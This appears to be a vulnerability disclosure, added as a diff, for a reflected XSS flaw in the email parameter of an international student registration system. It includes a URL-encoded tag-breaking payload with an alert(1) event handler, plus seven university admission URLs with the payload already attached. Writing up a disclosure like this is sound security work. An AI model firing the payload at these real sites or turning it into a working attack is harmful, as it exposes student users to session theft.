@@ -1,0 +1,87 @@
+---------------------------------------------------------------
+
+> [Vulnerability Type]
+
+>> Cross Site Scripting (XSS)
+
+---------------------------------------------------------------
+
+> [Affected Component]
+
+>> %3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+---------------------------------------------------------------
+
+> [Attack Type]
+
+>> Remote
+
+---------------------------------------------------------------
+
+> [Impact Escalation of Privileges]
+
+>> true
+
+---------------------------------------------------------------
+
+> [Attack Vectors]
+
+>> The system s registration feature, after sending the
+
+>> registration request packet, automatically issues a
+
+>> follow-up request to check whether the submission
+
+>> succeeded. If it did, it returns an email registration
+
+>> successful page. In this process, the value of the email
+
+>> parameter is directly embedded into the HTML of the
+
+>> returned page inside a tag. An attacker can craft a
+
+>> malicious payload at registration time that closes the tag
+
+>> "e.g.:<strong></strong><strong> <strong>poc</strong> "so
+
+>> that the injected payload executes, resulting in a
+
+>> reflected XSS attack.
+
+---------------------------------------------------------------
+
+> [Discoverer]
+
+>> cunyu
+
+---------------------------------------------------------------
+
+> [Reference]
+
+>> https://admission.sues.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+>> http://admission.ujs.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+>> https://study-info.tongji.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+>> http://is.tyut.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+>> http://study.dufe.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+>> http://apply.cau.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+>> http://iaa.suda.edu.cn/member/regconfirm.do?email=%3C/strong%3E%3Cmap%20onmousemove%3d%22alert(1)%22%3Etest%3C%2fmap%3E%3Cstrong%3E
+
+---------------------------------------------------------------
+
+> [Vendor of Product]
+
+>> http://www.17gz.org/
+
+---------------------------------------------------------------
+
+> [Affected Product Code Base]
+
+>> International Student service system =1.0
+
+---------------------------------------------------------------
